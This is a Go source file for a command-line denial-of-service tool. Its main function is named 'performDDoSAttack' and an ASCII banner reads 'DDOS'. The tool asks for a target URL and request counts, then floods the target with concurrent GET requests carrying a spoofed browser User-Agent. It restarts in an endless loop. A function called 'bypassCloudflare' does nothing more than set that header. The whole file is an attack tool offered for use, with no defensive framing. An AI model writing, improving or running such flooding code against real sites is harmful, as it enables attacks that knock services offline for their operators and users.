package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
)

var auth = `
 ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
█ ▄▀   █ █ ▄▀   █ █      █ █ █   ▐ 
▐ █    █ ▐ █    █ █      █    ▀▄   
  █    █   █    █ ▀▄    ▄▀ ▀▄   █  
 ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
█     ▐  █     ▐            ▐      
▐        ▐                                
`

func bypassCloudflare(targetURL string) error {
	client := &http.Client{}
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Mozilla/4.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.1245.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)
	return err
}

func performDDoSAttack(targetURL string, numRequests int, numThreads int) {
	var successCount, failureCount int
	var wg sync.WaitGroup
	var mu sync.Mutex

	worker := func() {
		defer wg.Done()
		for i := 0; i < numRequests/numThreads; i++ {
			err := bypassCloudflare(targetURL)
			mu.Lock()
			if err == nil {
				successCount++
				fmt.Printf("\033[32m[+] Request successful: %d\n", successCount)
			} else {
				failureCount++
				fmt.Printf("\033[31m[-] Failed request: %d\n", failureCount)
			}
			mu.Unlock()
		}
	}

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go worker()
	}

	wg.Wait()
}

func clearScreen() {
	var command string
	var args []string

	if runtime.GOOS == "windows" {
		command = "cmd"
		args = []string{"/c", "cls"}
	} else {
		command = "clear"
		args = []string{}
	}

	cmd := exec.Command(command, args...)
	cmd.Stdout = os.Stdout
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error clearing screen:", err)
	}
}

func main() {
	for {
		clearScreen()
		fmt.Println(auth)
		fmt.Print("\033[32mEnter the target address: \x1b[0m")
		var targetURL string
		fmt.Scanln(&targetURL)

		fmt.Print("\033[32mHow many requests should it send per second: \x1b[0m")
		var numThreads int
		fmt.Scanln(&numThreads)

		fmt.Print("\033[32mHow many requests should be made in total: \x1b[0m")
		var numRequests int
		fmt.Scanln(&numRequests)

		performDDoSAttack(targetURL, numRequests, numThreads)
		fmt.Println("\n\x1b[31mThe program is restarting. Waiting for 5 seconds...\x1b[0m")
		time.Sleep(5 * time.Second)
	}
}
